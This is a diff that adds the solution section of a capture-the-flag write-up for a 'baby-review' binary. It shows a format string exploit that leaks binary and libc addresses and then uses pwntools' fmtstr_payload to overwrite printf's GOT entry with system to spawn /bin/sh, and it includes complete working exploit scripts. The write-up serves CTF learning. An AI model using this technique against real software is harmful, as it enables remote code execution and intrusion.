@@ -62,3 +62,143 @@ Knowing this I opted to try and solve this using the common method of overwritin
 
 # Solution:
 
+To start we need two leaks. One to get the base address of the binary and one for the base address of the libc. We need these two because getting the base of the binary helps us find the address of all GOT functions allowing us to overwrite any we want. Then the base of libc allows us to find the address of system which will allow us to call system('/bin/sh') and pop a shell.
+
+To find good addresses for leaking is just a lot of trial and error. I also temporarily disabled ASLR when doing this to make the process a little easier. I used a leak.py script that printed the first 50 pointers in memory. I got a list of 50 and cleaned it up to remove any that were nil or just not accessible addresses. My cleaned up list was:
+```
+Offset 3: 0x7ffff7e9da37
+Offset 4: 0x7ffff7fa4a70
+Offset 5: 0x7ffff7fa4a70
+Offset 7: 0x7fffffffdb90
+Offset 8: 0x7fffffffdce0
+Offset 9: 0x555555555580
+Offset 27: 0x7ffff7e13f6d
+Offset 29: 0x7ffff7fa3780
+Offset 31: 0x55555555a690
+Offset 33: 0x7ffff7e15a61
+Offset 36: 0x7ffff7fa3780
+Offset 37: 0x555555556375
+Offset 38: 0x7ffff7fa3868
+Offset 39: 0x7ffff7f9f600
+Offset 40: 0x7ffff7ffd040
+Offset 41: 0x7ffff7e15f43
+Offset 43: 0x7ffff7fa3780
+Offset 44: 0x555555556375
+Offset 45: 0x7ffff7e0a02a
+Offset 49: 0x7fffffffdd40
+```
+The addresses starting with 0x7f were usually in the libc while addresses starting with 0x55 were in the binary. For each of these addresses I would simply run `x/s address` to see what was at that address. Going through the libc ones first I eventually found offset 29 was quite convenient as it pointed exactly to the address of the function `_IO_2_1_stdout_`.
+
+![image](https://user-images.githubusercontent.com/91157382/232246600-e570e50f-86ef-4d28-8a1f-751b6fa1763d.png)
+
+This is convenient as in our pwntools script we will just be able to subtract the location of `_IO_2_1_stdout_` in our provided libc file from our leak and we will get the base of our libc.
+
+Next for the base address of the binary I ended up using the very first possible address at offset 9 as it pointed to the address of menu+198, so this is again simple to find the base address of the binary again with pwntools. All we have to do is subtract the location of menu in our binary and subtract 198 to get the base of our binary.
+
+![image](https://user-images.githubusercontent.com/91157382/232246879-7c094640-85c6-4a76-9b7b-24d4e7a48434.png)
+
+Now I started to build the script and double-checked to make sure the addresses my script was generating would match up with the base addresses by attaching gdb and running `info proc map`. I also re-enabled ASLR to ensure it works dynamically too.
+```python
+from pwn import *
+
+elf = ELF('./baby-review',checksec=False)
+libc = ELF('libc.so.6',checksec=False)
+p = process(elf.path)
+gdb.attach(p)
+
+p.recvline()
+print(p.recvline().decode())
+capital = "Paris"
+p.sendline(capital.encode('utf-8'))
+
+p.clean()
+p.sendline(b'5')
+p.recvline()
+payload = b'%9$p %29$p'
+p.sendline(payload)
+p.clean()
+p.sendline(b'2')
+p.recvline()
+p.recvline()
+p.recvline()
+p.recvline()
+p.recvline()
+
+leaks = p.recvline().decode().strip().split(' ')
+binLeak = leaks[0]
+binBase = int(binLeak,16) - elf.symbols['menu'] - 198
+libcLeak = leaks[1]
+libcBase = int(libcLeak,16) - libc.symbols['_IO_2_1_stdout_']
+
+print("Binary Base: " + hex(binBase))
+print("Libc Base: " + hex(libcBase))
+
+p.interactive()
+```
+
+![image](https://user-images.githubusercontent.com/91157382/232248132-d6498cdc-b531-4063-908c-c247c8ed66d4.png)
+
+Great, leaking addresses is working perfectly, now we can move onto the next step, overwriting the GOT.
+
+Before overwriting anything we need to figure out which function in the GOT to overwrite. I know I want system() from the libc to be called, but what function would work best to replace with system. Because we are trying to pass the parameter /bin/sh we usually want to choose a function in the GOT that is run with only a single parameter and we have control over that parameter. In this case there is no simple gets or puts, but if you think about it there is a function that takes in our input as a parameter and we have already been using it. Printf!
+
+That's right, printf is in the GOT, so if we overwrite it with system, we can simply call add_movie again, input /bin/sh as our text. Then once we call watch_movie, it won't print /bin/sh, but instead call system and pass it one parameter, which will be our input of /bin/sh.
+
+The last part to figure out is how to use %n and its variations to overwrite the GOT entry for printf with system. Well pwntools has a neat function called fmtstr_payload. I was not aware of the function during the CTF, but now that I know about it, this is definitely a must have for any printf vulnerability challenge. In order to understand it and its parameters better I will show the pwntools documentation entry about it. If you'd like to read more about it or see some examples you can find them here: https://docs.pwntools.com/en/stable/fmtstr.html.
+
+![image](https://user-images.githubusercontent.com/91157382/232249177-c497f13e-63e6-42c6-bfd9-05102220f1bd.png)
+
+So this function takes three necessary parameters: offset and writes. We don't need to worry about numbwritten in our case as it is good with the default of 0 and write_size refers to the length modifiers I mentioned earlier, preferably we should keep this at byte or short to use %hhn and %hn respectively, but we can keep this parameter at the default write size of byte as it is ok if our payload is a little longer.
+To figure out what our offset parameter should be, we need to input some characters and read memory in the same payload and find at what offset we first start to see our characters.
+
+![image](https://user-images.githubusercontent.com/91157382/232249609-5502f641-206b-4872-a1d1-1f074dc0d463.png)
+
+This is quite easy to do and requires no scripting you can just run the binary on its own. We see our A's or 0x41 in hex starts to appear at the 10th offset first. So offset will be 10 in our script.
+
+The next parameter writes is simply a dictionary with the format {address: value} of what we want to overwrite. So, we want to overwrite the GOT entry for printf which can be easily found with pwntools like so: `elf.got['printf']` and we want to overwrite it with the address of system in our libc file which can be found like like this: `libc.symbols['system']`.
+
+We now have everything we need and just have to put it all together in a script. To the end of the script to find leaks I added:
+```python
+elf.address = binBase
+libc.address = libcBase
+
+p.clean()
+p.sendline(b'5')
+p.clean()
+writes = {
+    elf.got['printf']: libc.symbols['system']
+}
+payload = fmtstr_payload(10, writes)
+p.sendline(payload)
+
+p.clean()
+p.sendline(b'2')
+p.clean()
+p.sendline(b'5')
+p.recvline()
+p.sendline(b'/bin/sh')
+p.clean()
+p.sendline(b'2')
+p.clean()
+p.interactive()
+```
+
+Now when I run the script I should get a shell! But instead, I got an error :(
+
+![image](https://user-images.githubusercontent.com/91157382/232249881-16702e65-bc81-4432-a4df-c01ffd49e9c9.png)
+
+This error was quite annoying to debug, but I knew something was wrong with my call to fmtstr_payload so I looked back at the documentation and read the first sentence: "Makes payload with given parameter. It can generate payload for 32 or 64 bits architectures. The size of the addr is taken from `context.bits`". Looking through more pwntools documentation I found the default of context.bits is set to 32, but our binary is 64 bit which was causing the error.
+
+![image](https://user-images.githubusercontent.com/91157382/232249985-2a252810-ccf4-479e-9d5a-27e2f3db2739.png)
+
+This is easily fixed, at the top of my script instead of running:
+```python
+elf = ELF('./baby-review',checksec=False)
+```
+we can run:
+```python
+elf = context.binary = ELF('./baby-review',checksec=False)
+```
+Now context.binary will be set to our binary which will automatically update many values of context, including context.bits for us. Now that I figured out the error I ran it again and voila we get our flag!
+
+![image](https://user-images.githubusercontent.com/91157382/232250085-1e477d91-a630-45df-b62e-684def691996.png)
